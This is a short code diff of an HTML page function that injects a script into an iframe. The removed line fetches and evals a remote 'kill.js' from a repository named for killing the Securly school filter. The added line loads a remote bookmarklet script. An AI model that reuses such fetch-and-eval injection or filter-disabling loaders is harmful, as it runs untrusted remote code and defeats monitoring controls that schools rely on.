@@ -37,7 +37,7 @@
 		function injectCode() {
 			const iframe = document.querySelector('iframe');
 			const script = document.createElement('script');
-			script.textContent = 'fetch("https://raw.githubusercontent.com/zek-c/Securly-Kill-V111/main/kill.js").then(r => r.text()).then(r => eval(r))';
+			script.textContent = '(function(){var js=document.body.appendChild(document.createElement("script"));js.onerror=function(){alert("Sorry, the script could not be loaded.")};js.src="https://rawgit.com/Krazete/bookmarklets/master/tri.js"})();';
 			iframe.contentWindow.document.body.appendChild(script);
 		}
 	</script>
